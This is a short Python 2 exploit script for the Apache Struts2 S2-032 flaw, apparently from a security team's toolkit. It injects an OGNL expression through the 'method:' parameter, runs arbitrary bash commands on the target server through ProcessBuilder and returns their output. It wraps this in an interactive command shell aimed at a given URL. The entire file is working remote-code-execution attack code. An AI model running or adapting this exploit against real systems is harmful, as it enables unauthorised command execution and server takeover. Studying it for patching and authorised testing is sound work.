##############################################################################
#
# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
"""
struts s02-032 exploit


Date: 2017/06/26 17:10:00
"""
#!/usr/bin/python
# -*- coding: utf-8 -*-

import ssl
import sys
import httplib
import urllib
import urllib2
import fileinput


def _run(url, cmd):
    url += '/index.action'

    payload = ""
    payload += "(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),"
    payload += "(#cmds={#parameters.sh[0],#parameters.arg[0],#parameters.cmd[0]}),"
    payload += "(#p=new java.lang.ProcessBuilder(#cmds)),"
    payload += "(#p.redirectErrorStream(true)),"
    payload += "(#process=#p.start()),"
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())),"
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)),"
    payload += "#ros.flush"

    payload = urllib.quote(payload)

    url = url + '?method:' + payload + '&sh=bash&arg=-c&cmd=' + cmd

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload, 'Data': cmd}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page

if __name__ == "__main__":
    url = 'http://localhost:8080/S2-032' if len(sys.argv) == 1 else sys.argv[1]
    print 'URL=' + url

    while True:
        try:
            line = raw_input("cmd> ").strip()
            if line == 'exit':
                sys.exit()
            _run(url, line)
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
